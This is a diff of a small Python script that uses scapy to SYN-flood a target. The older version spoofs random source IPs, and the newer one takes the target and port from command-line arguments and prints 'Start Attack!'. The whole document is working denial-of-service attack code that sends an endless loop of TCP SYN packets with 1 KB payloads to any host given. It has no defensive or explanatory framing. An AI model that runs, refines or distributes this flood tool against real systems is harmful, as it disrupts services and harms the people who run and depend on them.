@@ -1,26 +1,28 @@
 from scapy.all import *
 import random
 import time
+import argparse
 
-target_ip = input("ip: ")
+parser = argparse.ArgumentParser()
 
-target_port = input('port: ')
+# parser.add_argument('-s', '--source', help='Source address', required=True)
+parser.add_argument('-t','--target', help='Destination address.', required=True)
+parser.add_argument('-p', '--port', help='Destination Port number', type=int, required=True)
 
-target_port = int(target_port)
+args = parser.parse_args()
 
-while True:
- if target_port and target_ip:
+target_ip =  args.target
 
-    source_ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+target_port = args.port
 
-    ip = IP(".".join(map(str, (random.randint(0, 255) for _ in range(4)))), dst=target_ip)
+if target_port and target_ip:
 
-    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
+   ip = IP(dst=target_ip)
 
-    raw = Raw(b"X"*1024)
+   tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
 
-    p = ip / tcp / raw
-   
-    send(p, loop=1, verbose=0)
-   
-    
+   raw = Raw(b"X"*1024)
+
+   p = ip / tcp / raw
+   print("Start Attack!")
+   send(p, loop=1, verbose=0)
